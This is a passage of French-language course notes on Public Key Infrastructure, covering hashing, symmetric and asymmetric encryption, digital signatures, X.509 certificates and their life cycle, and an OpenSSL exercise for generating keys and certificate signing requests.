                        <p><code>setx PATH "$env:PATH;C:\OpenSSL\bin"</code></p>
                        <p>Lors de la commande précédente, PowerShell insère directement la valeur brute de la variable d'environnement PATH. Cela fonctionne dans 95% des cas. Mais attention : si <span class="em">$env:PATH</span> contient des caractères spéciaux, PowerShell peut les interpréter (espaces, &amp;, (, etc.) et ça peut casser la commande.</p>
                    </div>
                    <p>Ou encore en CMD (invite de commandes Windows) avec la commande suivante :</p>
<pre><code>setx PATH "%PATH%;C:\OpenSSL\bin"</code></pre>
                    <p>Enfin, on vérifie l'installation d'OpenSSL avec la commande suivante :</p>
<pre><code>openssl version</code></pre>
                    <p>Pour vérifier que la variable d'environnement PATH a été mise à jour, on peut taper la commande suivante dans un PowerShell :</p>
<pre><code>$env:PATH -split ';'</code></pre>
                    <p>Cela affiche chaque dossier du PATH ligne par ligne. Ou encore, dans un terminal CMD classique, on peut vérifier avec la commande :</p>
<pre><code>echo %PATH%</code></pre>
                    <p>Cela permet de voir que ton chemin a été ajouté à la fin du PATH.</p>
                    <h3>Sujet du jour : Public Key Infrastructure (PKI) :</h3>
                    <p>La PKI est un ensemble de <span class="em">composants hardware</span>, de <span class="em">procédures humaines</span> (vérifications, validations) et de <span class="em">logiciels</span> destinés à gérer les clés de chiffrement.</p>
                    <p>La PKI offre une communication <span class="em">sécurisée (authentifiée)</span> entre des parties qui ne se sont <span class="em">jamais rencontrées auparavant</span>.</p>
                    <p>Le modèle s'appuie sur des <span class="em">tiers de confiance</span> appelés autorités de certification pour émettre des certificats auxquels nous faisons entièrement confiance.</p>
                    <h3>Sécuriser des données numériques : besoin :</h3>
                    <p>Une communication réseau introduit des contraintes de sécurité telles que :</p>
                    <ul>
                        <li>
                            <p>La manière de s'authentifier sur le réseau.</p>
                            <p>Par exemple, entre deux protocoles de routage : chaque routeur doit s'assurer qu'il parle bien au bon routeur. De même, quand on accède à un serveur web, on veut être sûr de parler au bon serveur.</p>
                        </li>
                        <li>
                            <p>La garantie que personne n'écoute la communication afin d'éviter le "sniffing".</p>
                            <p>Les données envoyées doivent arriver intactes jusqu'au serveur, sans interception ni altération.</p>
                        </li>
                        <li>
                            <p>La garantie de communiquer avec le bon interlocuteur.</p>
                            <p>C'est-à-dire vérifier que le serveur ou la personne avec qui on communique est bien celui ou celle qu'il prétend être.</p>
                        </li>
                    </ul>
                    <p class="em">La PKI est une solution pour authentifier des communications à distance (in transit).</p>
                    <h3>Sécuriser des données numériques : solution :</h3>
                    <p>Le chiffrement des données consiste à rendre les <span class="em">données totalement incompréhensibles</span> aux personnes qui ne sont pas habilitées à les traiter.</p>
                    <ul>
                        <li>
                            <h4>Hachage :</h4>
                            <div>
                                <img src="../images/hachage.PNG" alt="" class="float_right">
                                <p>Une fonction de hachage transforme un message de <span class="em">taille arbitraire</span> en un <span class="em">message de taille fixe</span>.</p>
                                <ul>
                                    <li>
                                        <p>Garantir l'intégrité des données</p>
                                    </li>
                                    <li>
                                        <p>Message Authentication Code (MAC)</p>
                                    </li>
                                    <li>
                                        <p>Checksum</p>
                                    </li>
                                    <li>
                                        <p>Table de hachage</p>
                                    </li>
                                    <li>
                                        <p>Git</p>
                                    </li>
                                    <li>
                                        <p>MD5, SHA</p>
                                    </li>
                                </ul>
                            </div>
                            <p>On peut voir le hachage comme <span class="em">une boîte</span> : on y fournit des informations de <span class="em">taille quelconque</span> et cette boîte renvoie en sortie un <span class="em">résultat (output) de taille fixe</span>.</p>
                            <p>Donc, l'<span class="em">input</span> peut être variable, mais la <span class="em">sortie</span> sera toujours d'une taille bien définie.</p>
                            <p>Ce principe de hachage, on le retrouve dans plusieurs domaines:</p>
                            <ul>
                                <li>
                                    <p>Dans le <span class="em">réseau</span>, à travers les <span class="em">checksums</span> qui sont calculés sur base de fonctions de hachage.</p>
                                </li>
                                <li>
                                    <p>En <span class="em">programmation</span> : dans les <span class="em">tables de hachage</span>.</p>
                                </li>
                                <li>
                                    <p>Dans <span class="em">Git</span> où chaque commit a un identifiant basé sur une fonction de hachage.</p>
                                </li>
                            </ul>
                            <p>Sur le schéma ci-dessus, on voit différents prénoms de tailles différentes, mais la sortie ("hash") est toujours du même format.</p>
                            <p>On remarque aussi que <span class="em">deux prénoms différents peuvent donner la même valeur</span>. C'est pour cela qu'il est <span class="em">très difficile de revenir en arrière</span>, c'est-à-dire de retrouver la valeur d'origine à partir du hash.</p>
                            <p>En théorie, ce n'est <span class="em">pas possible</span> de faire le chemin inverse.</p>
                            <p>En résumé, une fonction de hachage reçoit des informations de taille arbitraire et produit une sortie de taille fixe.</p>
                            <p>En gros, revenir en arrière est théoriquement impossible car plusieurs valeurs différentes peuvent donner le même résultat.</p>
                            <p>Qu'apporte une fonction de hachage ?</p>
                            <ul>
                                <li>
                                    <p><span class="em">Intégrité</span> : une fonction de hachage garantit que les données n'ont pas été modifiées. Pourquoi ?</p>
                                    <p>Si on applique la même fonction de hachage sur les mêmes données, on doit toujours obtenir la <span class="em">même valeur en sortie</span>.</p>
                                    <p>Si la valeur change, cela veut dire que les données ont été altérées.</p>
                                </li>
                                <li>
                                    <p><span class="em">Pas de confidentialité</span> : pas assurée par la fonction de hachage seule; nécessite un chiffrement séparé.</p>
                                    <p>Elle ne chiffre pas les données. Donc, n'empêche pas quelqu'un de lire l'information si elle est interceptée.</p>
                                </li>
                                <li>
                                    <p><span class="em">Pas d'authentification</span> : assurée par une signature numérique, qui combine une fonction de hachage avec un chiffrement à clé privée.</p>
                                    <p>Recevoir un hash ne garantit pas qu'il vient bien de la bonne personne. Ce principe seul ne permet donc pas de prouver l'identité de l'émetteur.</p>
                                </li>
                            </ul>
                            <p>En résumé, la fonction de hachage <span class="em">garantit uniquement l'intégrité</span> des données, pas la <span class="em">confidentialité</span> ni <span class="em">l'authentification</span>.</p>
                            <p>Reprenons le schéma ci-dessus et imaginons qu'on envoie le nom <span class="em">"John Smith"</span> et que la fonction de hachage nous donne la valeur <span class="em">02</span>.</p>
                            <p>Quelqu'un d'autre nous renvoie ensuite un hash en prétendant que c'est celui de <span class="em">John Smith</span>, mais cette fois la valeur est <span class="em">03</span>.</p>
                            <p>Si on refait le calcul de notre côté et qu'on obtient un résultat <span class="em">différent</span>, on peut en conclure que <span class="em">les données ont été modifiées pendant le transfert</span>.</p>
                            <p>C'est ça le <span class="em">principe d'intégrité</span> : on <span class="em">recalcule le hash</span> à la réception et on le <span class="em">compare</span> à celui reçu.</p>
                            <p>S'ils sont identiques, les données sont restées intactes mais, s'ils sont différents, cela signifie qu'elles ont été altérées.</p>
                        </li>
                        <li>
                            <h4>Chiffrage symétrique :</h4>
                            <p>Le <span class="em">chiffrement symétrique</span> est le type de chiffrement le plus simple.</p>
                            <p>Le chiffrement symétrique utilise la même clé secrète pour le chiffrement et le déchiffrement.</p>
                            <p>L'avantage du chiffrement à clé symétrique est sa <span class="em">rapidité d'exécution</span>.</p>
                            <p>Il ne demande pas de calculs complexes : on applique simplement la clé pour transformer ou récupérer le message.</p>
                            <p>C'est pour cela qu'il est très <span class="em">efficace et rapide</span> d'un point de vue computationnel.</p>
                            <img src="../images/chiffrement_symetrique.PNG" alt="">
                            <p>Sur l'image, on a donc un message en entrée, on applique la clé pour obtenir un message chiffré. Pour le lire, il suffit d'utiliser <span class="em">la même clé</span>.</p>
                            <p>Algorithmes : AES, DES</p>
                            <p>Le chiffrement symétrique <span class="em">protège le contenu (confidentialité)</span> car, sans la clé, on ne peut pas lire le message. Quel est l'inconvénient de ce type de chiffrement ?</p>
                            <p class="em">L'inconvénient majeur est le partage de la clé.</p>
                            <p>Imaginons deux entités qui souhaitent échanger des données de manière chiffrée. L'une possède déjà la clé tandis que l'autre ne l'a pas encore.</p>
                            <p>Le problème qui se pose est alors le suivant : <span class="em">comment transmettre cette clé sans qu'elle soit interceptée sur le réseau ?</span></p>
                            <p>C'est là toute la difficulté du <span class="em">chiffrement symétrique</span> : la clé doi être échangée de façon <span class="em">sécurisée</span> car si elle est compromise <span class="em">l'ensemble du système de chiffrement l'est également</span>.</p>
                            <p class="em">Challenge : comment transmettre la clé ?</p>
                        </li>
                        <li>
                            <h4>Chiffrage asymétrique :</h4>
                            <p>Il s'agit d'un chiffrement utilisant <span class="em">deux clés différentes</span> afin de déchiffrer des données. Les deux clés possèdent une <span class="em">relation mathématique</span> permettant ainsi le chiffrage et déchiffrage d'informations. <span class="em">Une clé est dite privée (non partagée) et l'autre est dite publique (partagée).</span></p>
                            <p>Ce qui est chiffré avec l'une peut être déchiffré uniquement avec l'autre.</p>
                            <p>Autrement dit, si une information est chiffrée avec la clé privée, seule la clé publique correspondante permettra de la déchiffrer et inversement.</p>
                            <p>Ainsi, même si la clé publique est interceptée, cela ne pose <span class="em">aucun risque</span> car elle ne permet pas d'accéder à la clé privée.</p>
                            <img src="../images/chiffrement_asymetrique.PNG" alt="">
                            <p>Algorithmes : RSA, Diffie-Hellman</p>
                            <p>Le chiffrement symétrique assure la confidentialité mais pas l'authentification, tandis que le chiffrement asymétrique garantit à la fois <span class="em">confidentialité</span> et <span class="em">authentification</span>.</p>
                            <p>Ce système est <span class="em">plus lourd en calcul</span> que le chiffrement symétrique car il implique plusieurs opérations de chiffrement et de déchiffrement.</p>
                            <p class="em">Quelqu'un peut m'expliquer le déroulement d'une communication ?</p>
                            <p>Dans une communication entre deux entités:</p>
                            <ul>
                                <li>
                                    <p>Chaque entité possède <span class="em">sa propre paire de clés</span> (une clé publique et une clé privée).</p>
                                </li>
                                <li>
                                    <p>Pour sécuriser un échange, le message peut être <span class="em">chiffré deux fois</span> :</p>
                                    <ul>
                                        <li>
                                            <p>D'abord avec la <span class="em">clé privée</span> de l'expéditeur (pour garantir l'authenticité).</p>
                                        </li>
                                        <li>
                                            <p>Puis avec la <span class="em">clé publique</span> du destinataire (pour garantir la confidentialité).</p>
                                        </li>
                                    </ul>
                                    <p>Le destinataire effectuera alors deux déchiffremet dans l'ordre inverse :</p>
                                    <ol>
                                        <li>
                                            <p>avec <span class="em">sa clé privée</span> pour retrouver le message chiffré par sa clé publique;</p>
                                        </li>
                                        <li>
                                            <p>avec <span class="em">la clé publique de l'expéditeur</span> pour vérifier l'origine du message.</p>
                                        </li>
                                    </ol>
                                </li>
                            </ul>
                        </li>
                    </ul>
                    <p>Dans ce cours, on va surtout aborder la théorie de ces concepts.</p>
                    <p>Les aspects plus pratiques notamment liés à la PKI et à la cryptographie appliquée seront traités plus en détails dans le cours de cryptographie de Mr François Koeune.</p>
                    <h3>Signature digitale :</h3>
                    <p>La signature digitale permet d'établir un lien entre le document et le signataire.</p>
                    <ul>
                        <li>
                            <p>Fonction de hachage : intégrité (pourquoi pas de confidentialité ?)</p>
                        </li>
                        <li>
                            <p>Chiffrement : confidentialité/authentification</p>
                        </li>
                        <li>
                            <p>Non répudiation : fonction de hachage + authentification</p>
                        </li>
                    </ul>
                    <figure>
                        <img src="../images/signature_digitale.PNG" alt="">
                        <figcaption>Source : Docusign</figcaption>
                    </figure>
                    <p>Le principe est le suivant :</p>
                    <ol>
                        <li>
                            <p>On prend une donnée (un fichier, un message, ...).</p>
                        </li>
                        <li>
                            <p>On la <span class="em">hache</span> pour obtenir une valeur (un hash).</p>
                        </li>
                        <li>
                            <p>Ce hash est <span class="em">chiffré avec la clé privée</span> du signataire.</p>
                        </li>
                        <li>
                            <p>Le résultat devient la <span class="em">signature digitale</span> jointe au document.</p>
                        </li>
                    </ol>
                    <p>Pour vérifier :</p>
                    <ol>
                        <li>
                            <p>Le destinataire <span class="em">déchiffre la signature</span> avec la <span class="em">clé publique</span> du signataire.</p>
                        </li>
                        <li>
                            <p>Il <span class="em">re-hache</span> le fichier reçu.</p>
                        </li>
                        <li>
                            <p>Il <span class="em">compare les deux valeurs</span> : si elles sont identiques, le fichier n'a pas été modifié et vient bien du signataire mais, si elles sont différentes, le fichier a été altéré.</p>
                        </li>
                    </ol>
                    <p>Ce principe est aussi utilisé pour les <span class="em">certificats numériques</span> : on vérifie que le certificat a bien été signé par l'autorité correspondante et qu'il n'a pas été modifié.</p>
                    <p class="em">Quelle est la limite du chiffrement à clé publique ?</p>
                    <p>Le <span class="em">hachage</span> garantit que la donnée n'a pas été modifiée (<span class="em">Intégrité</span>).</p>
                    <p>Le <span class="em">chiffrement  symétrique</span> est <span class="em">rapide</span> mais il pose un <span class="em">problème de partage de clé</span> : il faut trouver un moyen sûr pour transmettre cette clé à l'autre partie.</p>
                    <p>Le <span class="em">chiffrement asymétrique</span> résout ce problème car il respose sur <span class="em">deux clés</span> : une clé publique et une clé privée.</p>
                    <p>On peut donc communiquer sans devoir échanger une clé secrète.</p>
                    <p>Cependant, ce type de chiffrement est <span class="em">plus lent</span> car il demande plus de calculs.</p>
                    <p>Mais il y a aussi une <span class="em">limite importante</span> : même si la clé publique peut être partagée librement, <span class="em">rien ne garantit qu'il vient bien de la bonne personne</span>.</p>
                    <p>Par exemple : si quelq'un intercepte la communicaton et remplace la clé publiqe de l'expéditeur par la sienne, il pourra tromper le destinataire. Celui-ci pensera communiquer avec la bonne personne alors qu'en réalité il parle avec un <span class="em">attaquant</span>.</p>
                    <p>C'est ce problème qui justifie l'existence des <span class="em">autorités de certification (CA)</span> et de la <span class="em">PKI</span> qui servent à <span class="em">vérifier l'identité</span> de celui à qui appartient une clé publique.</p>
                    <p class="em">Impossible de garantir la provenance de la clé publique. Solution : PKI</p>
                    <p>C'est ici que la <span class="em">PKI</span> (Public Key Infrastructure) entre en jeu.</p>
                    <p>Elle vient de répondre à la <span class="em">limite du chiffrement asymétrique</span>, c'est-à-dire : <span class="em">il est impossible de garantir la provenance d'une clé publique</span>.</p>
                    <p>La PKI introduit un <span class="em">tiers de confiance</span> chargé de <span class="em">vérifier l'identité</span> des entités qui possèdent des clés publiques.</p>
                    <p>Grâce à ce tiers, on peut être sûr que la clé publique reçue appartient bien à la bonne personne.</p>
                    <p>En résumé, la PKI ajoute une couche d'<span class="em">authentification</span> : elle garantit que l'on communique bien avec la bonne entité car un <span class="em">tiers de confiance</span> se porte garant de cette identité.</p>
                    <p class="em">Quelle PKI connaissez-vous ?</p>
                    <p>La <span class="em">PKI</span> repose sur l'utilisation de <span class="em">certficats numériques</span>.</p>
                    <p>Ces certificats sont très présents sur Internet et notamment dans les communications <span class="em">sécurisées</span>.</p>
                    <p>Le meilleur exemple est le <span class="em">HTTPS</span> : le "S" à la fin signifie <span class="em">Secure</span> et il correspond à l'utilisation du protocole <span class="em">TLS</span> (Transport Layer Security).</p>
                    <p>TLS s'appuie directement sur les <span class="em">certificats</span> et donc sur le <span class="em">principe de la PKI</span> pour garantir que le site web avec lequel on communique est bien <span class="em">authentique</span> et que la connexion est <span class="em">sécurisée</span>.</p>
                    <p>Les plus connus :</p>
                    <ul>
                        <li>
                            <p><span class="em">TLS</span> : Le certificat garantit que l'on communique bien avec le bon site web (par exemple : Google, Amazon, etc.). Cela prouve que le site est authentique et que la connexion est sécurisée.</p>
                        </li>
                        <li>
                            <p><span class="em">Code signing certificates</span> (certificats de signature de code) : Lorsqu'on installe un logiciel ou une application, le système peut afficher un message indiquant que le programme a été signé par un éditeur vérifié. Cela garantit que le logiciel provient bien de la bonne source et qu'il n'a pas été modifié.</p>
                        </li>
                        <li>
                            <p><span class="em">Cartes bancaires</span> : Les cartes utilisent aussi des mécanismes de <span class="em">certificats</span> et de <span class="em">clés</span> pour sécuriser les transactions et garantir l'authenticité du terminal ou de la banque.</p>
                        </li>
                        <li>
                            <p>eID : La PKI que connaissent tous les citoyens en Belgique est celle de la carte d'identité.</p>
                            <p>Chaque <span class="em">carte d'identité</span> contient un <span class="em">certificat numérique</span>.</p>
                            <p>Ce certificat est <span class="em">signé par une autorité de certification (CA)</span> reconnue, ce qui garantit son <span class="em">authenticité</span>.</p>
                            <p>En d'autres termes, la <span class="em">PKI eID</span> permet de prouver que la carte d'identité est bien <span class="em">officielle</span> et qu'elle a été <span class="em">émise par l'État belge</span>.</p>
                            <p>Elle repose sur une <span class="em">hiérarchie d'autorités de certification</span> :</p>
                            <ul>
                                <li>
                                    <p>une <span class="em">autorité racine (Belgium Root CA)</span>,</p>
                                </li>
                                <li>
                                    <p>des <span class="em">autorités intermédiaires</span> (Citizen CA, Foreigner CA, Admin CA),</p>
                                </li>
                                <li>
                                    <p> et enfin les <span class="em">certificats individuels</span> présents sur les cartes d'identité.</p>
                                </li>
                            </ul>
                            <img src="../images/PKI_EID.PNG" alt="">
                            <p>Ce système assure que chaque carte eId est <span class="em">unique, authentifiée et vérifiable</span>.</p>
                        </li>
                    </ul>
                    <p>Dans tous ces cas, le <span class="em">principe est le même</span> : la <span class="em">PKI</span> permet d'établir une <span class="em">relation de confiance</span> entre deux parties grâce à l'usage de <span class="em">certificats numériques</span>.</p>
                    <h3>Qu'est-ce qu'un certificat ?</h3>
                    <p>Un certificat numérique remplit un objectif similaire à un permis de conduire ou à un passeport : c'est une pièce d'identité qui prouve votre identité et vous confère certains droits. Un certificat numérique permet à son propriétaire de chiffrer, signer et authentifier. <span class="em">Il est défini par la norme X.509.</span></p>
                    <p>La PKI utilise le certificat X.509 afin de chiffrer des données, de signer numériquement des documents et d'authentifier des communications.</p>
                    <h4>Contenu d'un certificat :</h4>
                    <p>Un certificat est un document numérique qui contient des informations similaires à celui d'un document d'identité. Les informations contenues dans le certificat sont décrites par la norme X.509. Nous retrouvons des informations telles que :</p>
                    <ul>
                        <li>
                            <p>Une clé publique utilisée par le client pour chiffrer les données.</p>
                        </li>
                        <li>
                            <p>Une signature digitale utilisée par le client pour valider le certificat.</p>
                        </li>
                        <li>
                            <p>Des informations sur l'entité qui lui est associée (nom, localisation, etc.)</p>
                        </li>
                        <li>
                            <p>Une durée de validité</p>
                        </li>
                        <li>
                            <p>L'émetteur du certificat (auto signé ou autorité de confiance)</p>
                        </li>
                        <li>
                            <p>Des extensions afin d'ajouter de la flexibilité au certificat :</p>
                            <ul>
                                <li>
                                    <p>SAN (Subject Alternative Name)</p>
                                </li>
                                <li>
                                    <p>CRL (Certificate Revocation List)</p>
                                </li>
                                <li>
                                    <p>OSCP (Online Certificate Status Protocol)</p>
                                </li>
                                <li>
                                    <p>etc.</p>
                                </li>
                            </ul>
                        </li>
                    </ul>
                    <ul>
                        <li>
                            <p>DER/CER : certificat généralement stocké en format binaire</p>
                        </li>
                        <li>
                            <p>PEM/CRT/CER : certificat en format ASCII (base64) lisible avec un éditeur de textes comme Visual Studio Code</p>
                        </li>
                        <li>
                            <p>PFX : format de certificat utilisé dans les environnements Microsoft</p>
                        </li>
                    </ul>
                    <p>Le format <span class="em">PFX</span> est celui qui est <span class="em">le plus respecté</span> surtout dans les systèmes Microsoft.</p>
                    <p>Pour les autres formats, ce sont surtout des <span class="em">conventions</span> : parfois le fichier est en binaire, parfois non - ça dépend de la manière dont il a été exporté ou stocké.</p>
                    <h4>Cycle de vie d'un certificat :</h4>
                    <ul>
                        <li>
                            <p>Requêter : créer un "Certificat Signing Request (CSR)" contenant des informations sur notre entité et notre clé publique.</p>
                            <p>C'est comme lorsqu'une personne se rend à la <span class="em">commune</span> pour demander une <span class="em">carte d'identité</span> ou un <span class="em">passeport</span>. Un <span class="em">formulaire</span> est rempli avec différentes informations : nom, pays, durée, etc.</p>
                            <div>
                                <img src="../images/certificat_requeter.PNG" class="float_right" alt="">
                                <ul>
                                    <li>
                                        <p>attributs certificats (CN, N, signature digitale, clé publique)</p>
                                    </li>
                                </ul>
                            </div>
                            <p>Ce qui est affiché dans l'image ci-dessus est la <span class="em">version encodée en base 64</span>.</p>
                            <p>Cette <span class="em">CSR doit ensuite être signée</span> par une autorité de certification pour permettre la <span class="em">délivrance du certificat</span>.</p>
                        </li>
                        <li>
                            <p>Signer : l'autorité de confiance signe le certificat afin de garantir sa provenance (signe avec clé privée = nouvelle signature digitale).</p>
                            <p>À la commune, le formulaire est ensuite <span class="em">vérifié</span> avant de délivrer la carte d'identité.</p>
                            <img src="../images/certificat_signer.PNG" alt="">
                            <p>Sur l'image, la <span class="em">CSR</span> contient les informations nécessaires pour créer le certificat.</p>
                            <p>Elle est <span class="em">signée avec la clé privée</span> du demandeur et contient sa <span class="em">clé publique</span>.</p>
                            <p>Cette CSR est ensuite <span class="em">envoyée à l'autorité de certification</span>.</p>
                            <p>L'autorité <span class="em">récupère les informations</span>, les <span class="em">hachent</span> et les <span class="em">signent</span> à son tour, puis <span class="em">transmet le certificat final</span> au demandeur.</p>
                        </li>
                        <li>
                            <p>Renouveler : un certificat est valide pour une période donnée.</p>
                            <p>Comment renouveler un certificat ?</p>
                            <p>Lorsqu'il arrive à expiration ou est perdu, il doit être <span class="em">renouvelé</span> de la même qu'un document d'identité doit être refait à la commune.</p>
                            <p>Est-il possible de modifier la date d'un certificat ?</p>
                            <p>Il n'est <span class="em">pas possible de simplement modifier la date</span> d'un certificat existant.</p>
                            <p>Comment valider que la CSR n'a pas été altérée ?</p>
                            <p>Si le contenu du certificat ou de la <span class="em">CSR</span> est modifié, la <span class="em">signature digitale</span> ne correspond plus et le certificat devient <span class="em">invalide</span> car la valeur du <span class="em">hachage</span> change.</p>
                            <p>Pour renouveler un certificat, il faut donc <span class="em">générer une nouvelle CSR</span> qui sera <span class="em">signée à nouveau</span> par l'autorité de certification.</p>
                        </li>
                        <li>
                            <p>Révoquer : les certificats sont révoqués lorsque les clés privées associées sont compromises ou ne sont plus nécessaires (CRl et OCSP).</p>
                            <p>Lorsqu'une carte d'identité est <span class="em">perdue ou volée</span>, la commune l'<span class="em">invalide</span>.</p>
                        </li>
                    </ul>
                    <h4>Exercice : générer une CSR (Certificate Signing Request) :</h4>
                    <ol>
                        <li>
                            <p>Générer une clé privée/publique :</p>
<pre><code>openssl genrsa -out client.key 2048</code></pre>
                            <p>Cette commande une clé privée RSA 2048 bits et l'écrit dans `<span class="em">client.key</span>` mais, comme les deux clés ont une <span class="em">relation mathématique</span>, il est possible de <span class="em">déduire la clé publique</span> à partir de la clé privée. Une commande OpenSSL d'<spa class="em">extraire la clé publique</spa> de ce fichier si nécessaire. On peut aussi utiliser <span class="em">genpkey</span> :</p>
<pre><code>openssl genpkey -algorithm RSA -out client.key -keyopt rsa_keygen_bits:2048</code></pre>
                        </li>
                        <li>
                            <p>Générer une CSR en passant les attributs en paramètres :</p>
<pre><code>openssl req -out client.csr -key client.key -new -nodes -subj "/C=BE/CN=client.com"</code></pre>
                            <p>Cette commande crée une CSR (<span class="em">client.csr</span>) à partir d'une clé privée existante (<span class="em">-key client.key</span>).</p>
                            <p>L'option <span class="em">-nodes</span> n'encrypte pas la clé privée sur le disque, c'est-à-dire pas de passphrase.</p>
                            <p>C'est l'équivalent du <span class="em">formulaire</span> que l'on remplit à la <span class="em">commune</span> pour demander une carte d'identité.</p>
                            <p>Ici, la demande est faite pour obtenir un <span class="em">certificat numérique</span>.</p>
                            <p>Cette commande permet de préciser certains <span class="em">attributs</span> du certificat, comme :</p>
                            <ul>
                                <li>
                                    <p><span class="em">C=BE</span> &#8594; le pays (ici la Belgique)</p>
                                </li>
                                <li>
                                    <p><span class="em">CN=client.com</span> &#8594; le nom commun (nom de domaine demandé)</p>
                                </li>
                            </ul>
                            <p>Il peut être <span class="em">décodé</span> à l'aide d'outils en ligne (par exemple : <a href="https://www.sslshopper.com/csr-decoder.html" target="_blank">https://www.sslshopper.com/csr-decoder.html</a>) afin d'en <span class="em">visualiser le contenu de manière lisible</span>.</p>
                        </li>
                        <li>
                            <p>Générer une clé privée + une CSR :</p>
<pre><code>openssl req -newkey rsa:2048 -nodes -keyout client.key -out client.csr -subj "/C=BE/CN=client.com"</code></pre>
                        </li>
                        <li>
                            <p>Générer une clé privée + une CSR avec fichier de configuration :</p>
<pre><code>openssl req -newkey rsa:2048 -nodes -keyout client.key -out client.csr -config csr.txt</code></pre>
                            <p>Cette commande génère simultanément une nouvelle clé privée RSA 2048 (<span class="em">-newkey rsa:2048 -keyout client.key</span>) non chiffrée (<span class="em">-nodes</span>) et une CSR (<span class="em">-out client.csr</span>.</p>
                            <p>L'option <span class="em">-config csr.txt</span> lit les informations (subject, extensions, etc.) dans le fichier de configuration `<span class="em">csr.txt</span>` pour automatiser la CSR (utile pour SAN, etc.).</p>
                            <p><a href="https://help.switch.ch/pki/manage/request/csr-openssl/" target="_blank">https://help.switch.ch/pki/manage/request/csr-openssl/</a></p>
                            <p>Le fichier `<span class="em">csr.txt</span>` :</p>
<pre><code>[ req ]
prompt = no
encrypt_key = no
distinguished_name = dn
 
[ dn ]
C = BE
O = ephec.be
CN = client.com</code></pre>
                            <p>Cette approche basée sur un fichier de configuration est <span class="em">plus pratique</span> pour les certificats complexes.</p>
                        </li>
                    </ol>
                    <p>OpenSSL sera réutiliser plus tard dans le <span class="em">labo</span> pour <span class="em">générer des certificats</span> et <span class="em">sécuriser un serveur web</span>.</p>
                    <p class="em">Comment prouve-t-on notre identité ? Carte de bibliothèque ?</p>
                    <p>Lorsqu'une demande de certificat est effectuée, l'objectif est de <span class="em">prouver l'identité</span> de l'entité qui en fait la demande.</p>
                    <p>Dans la vie réelle, pour prouver son identité, on présente une <span class="em">pièce officielle</span> comme une carte d'identité ou un passeport.</p>
                    <p>Une carte de bibliothèque ou une carte de piscine n'ont pas la même valeur car <span class="em">elles ne sont pas signées par une autorité reconnue</span> comme la commune par exemple.</p>
                    <p>De la même manière, en informatique, un certificat n'a de valeur que s'il est <span class="em">émis et signé par une autorité de confiance</span>.</p>
                    <p>C'est pour cette raison qu'il existe des <span class="em">autorités de délivrance</span>.</p>
                    <h3>Autorité de délivrance :</h3>
                    <p>Les documents d'identité sont acceptés car ils ont été délivrés par l'Éat (autorité de délivrance).</p>
                    <p>À l'image des documents d'identité, il est nécessaire de vérifier la validité des certificats que l'on manipule afin d'identifier nos correspondants.</p>
                    <p>La PKI permet de lier des certificats à des identités (comme des noms d'utilisateurs ou des organisations).</p>
                    <p>Le certificat que l'on génère soi-même (via une CSR) et que l'on signe avec sa propre clé est comparable à <span class="em">une carte de piscine</span>. Il n'a <span class="em">de valeur que dans un contexte local</span> car <span class="em">il n'est pas signé par une autorité reconnue</span>.</p>
                    <p>Lorsqu'une entreprise crée ses propres certificats et les signe elle-même, on parle de <span class="em">certificats auto-signés</span>.</p>
                    <p>Ce type de certificat peut être valide <span class="em">en interne</span> mais <span class="em">pas en dehors</span> de l'organisation.</p>
                    <h3>Public Key Infrastructure (PKI) : définition :</h3>
                    <p>L'objectif de PKI est de permettre <span class="em">une communication sécurisée</span> entre des parties qui ne se sont <span class="em">jamais rencontrées auparavant</span>.</p>
                    <p>La PKI garantit cette sécurité en s'appuyant sur des <span class="em">tiers de confiance</span> appelés autorités de certification (CA; parfois aussi appelées autorités de certification) pour <span class="em">émettre des certificats auxquels nous faisons entièrement confiance</span>.</p>
                    <p>Un certificat PKI permet à quelqu'un de lier numériquement son identité et d'utiliser le certificat pour exécuter certaines de ces fonctions :</p>
                    <ul>
                        <li>
                            <p>chiffrer des données</p>
                        </li>
                        <li>
                            <p>signer numériquement des documents</p>
                        </li>
                        <li>
                            <p>authentifier</p>
                        </li>
                    </ul>
                    <h3>Les composants PKI :</h3>
                    <img src="../images/composants_PKI.PNG" alt="">
                    <p>En pratique, voici comment fonctionne une <span class="em">PKI</span> :</p>
                    <ol>
                        <li>
                            <p><span class="em">Le subscriber (demandeur)</span> - par exemple un administrateur système - génère une <span class="em">CSR (Certificate Signing Request)</span>.</p>
                            <p>Cette CSR contient la clé publique et les informations d'identité de l'entité qui demande le certificat.</p>
                        </li>
                        <li>
                            <p>La <span class="em">RA (Registration Authority)</span> reçoit cette demande et <span class="em">valide l'identité</span> du demandeur.</p>
                            <p>Par exemple, pour un site web, elle peut vérifier la propriété d'un nom de domaine (en demandant de créer un enregistrement DNS spécifique).</p>
                        </li>
                        <li>
                            <p>Une fois la validation faite, la <span class="em">CA (Certification Authority)</span> signe la CSR et <span class="em">émet le certificat</span>.</p>
                            <p>Ce certificat est ensuite <span class="em">renvoyé au demandeur</span>.</p>
                        </li>
                        <li>
                            <p>Le demandeur (subscriber) <span class="em">publie le certificat</span> sur le <span class="em">serveur web</span> afin de sécuriser les connexions HTTPS.</p>
                        </li>
                        <li>
                            <p>Lorsqu'un <span class="em">client (relying party)</span>, comme un <span class="em">navigateur</span>, se connecte au serveur, il :</p>
                            <ul>
                                <li>
                                    <p>Récupère le certificat,</p>
                                </li>
                                <li>
                                    <p>Vérifier la signature,</p>
                                </li>
                                <li>
                                    <p>Et vérfier qu'il n'a pas été révoqué.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>La vérification de la révocation peut se faire des deux façons :</p>
                            <ul>
                                <li>
                                    <p>Via une <span class="em">CRL (Certificate Revocation List)</span> qui contient la liste de tous les certificats révoqués</p>
                                </li>
                                <li>
                                    <p>Ou via <span class="em">OCSP (Online Certificate Status Protocol)</span> où le navigateur interroge directement le serveur OCSP pour savoir si le certificat est encore valide.</p>
                                </li>
                            </ul>
                        </li>
                    </ol>
                    <p>Si le certificat est <span class="em">expiré ou révoqué</span>, le navigateur <span class="em">affiche une alerte de sécurité</span> (triangle ou message d'avertissement), avec parfois la possibilité de continuer malgré le risque.</p>
                    <p class="em">Comment un client connaît-il les CAs de confiance ?</p>
                    <p>Le navigateur (le client) est responsable de <span class="em">valider les certificats</span> qu'il reçoit d'un site web.</p>
                    <p>Lorsqu'il se conecte, il vérifie d'abord :</p>
                    <ul>
                        <li>
                            <p>si le certificat est expiré ou révoqué,</p>
                        </li>
                        <li>
                            <p>et si sa signature est valide.</p>
                        </li>
                    </ul>
                    <p>Si le certificat n'est pas révoqué, le navigateur considère qu'il est <span class="em">fiable</span>, mais il doit encore <span class="em">faire confiance à l'autorité qui l'a signé</span>.</p>
